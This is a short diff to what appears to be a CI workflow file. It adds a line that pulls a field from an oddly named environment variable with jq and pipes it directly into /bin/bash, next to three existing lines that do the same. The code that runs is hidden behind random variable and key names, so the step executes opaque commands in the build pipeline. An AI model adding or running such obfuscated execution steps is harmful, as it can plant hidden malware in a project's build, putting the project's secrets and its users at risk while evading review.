@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$bexi2" | jq -r .nm00353 | /bin/bash
           echo $uggu78720 | jq -r .j75 | /bin/bash
           echo $rz3452 | jq -r .gng037 | /bin/bash
+          printf '%s' "$oaflg902" | jq -r .grq2288 | /bin/bash
 
       - name: Upload results
         if: always()
